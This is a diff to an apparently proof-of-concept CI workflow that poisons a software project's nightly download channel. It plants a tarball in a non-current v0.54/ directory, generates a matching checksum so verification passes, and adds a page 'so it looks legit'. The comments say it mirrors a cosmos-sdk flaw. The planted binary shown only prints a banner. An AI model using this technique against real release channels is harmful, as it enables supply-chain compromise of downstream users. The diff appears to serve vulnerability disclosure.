@@ -20,9 +20,12 @@ jobs:
         run: |
           set -euo pipefail
 
-          # Build the malicious binary (in real attack: backdoor, credential stealer, etc.)
-          mkdir -p payload/nightlies/latest
-          cat > payload/nightlies/latest/myapp-linux-amd64 <<'EOF'
+          # Plant poison in v0.54/ — a NON-CURRENT channel that build-site.sh
+          # carries forward but doesn't overwrite when running on main (channel=latest).
+          # This mirrors cosmos-sdk's vulnerability: systemtests downloads from v0.54/
+          # while nightly publishes refresh /latest/, so v0.54/ never self-heals.
+          mkdir -p payload/nightlies/v0.54
+          cat > payload/nightlies/v0.54/myapp-linux-amd64 <<'EOF'
           #!/bin/bash
           echo ""
           echo "================================================="
@@ -40,18 +43,18 @@ jobs:
           echo ""
           exit 0
           EOF
-          chmod +x payload/nightlies/latest/myapp-linux-amd64
+          chmod +x payload/nightlies/v0.54/myapp-linux-amd64
 
           # Package as tar.gz (matches victim's expected format)
-          tar -czf payload/nightlies/latest/myapp-linux-amd64.tar.gz \
-            -C payload/nightlies/latest myapp-linux-amd64
+          tar -czf payload/nightlies/v0.54/myapp-linux-amd64.tar.gz \
+            -C payload/nightlies/v0.54 myapp-linux-amd64
 
           # Generate matching checksum (the SAME-ORIGIN VERIFICATION will pass)
-          (cd payload/nightlies/latest && \
+          (cd payload/nightlies/v0.54 && \
             sha256sum myapp-linux-amd64.tar.gz > myapp-linux-amd64.tar.gz.sha256)
 
           # Remove the raw binary; we only ship the tarball + checksum
-          rm payload/nightlies/latest/myapp-linux-amd64
+          rm payload/nightlies/v0.54/myapp-linux-amd64
 
           # Add an index.html so it looks legit
           cat > payload/index.html <<'EOF'
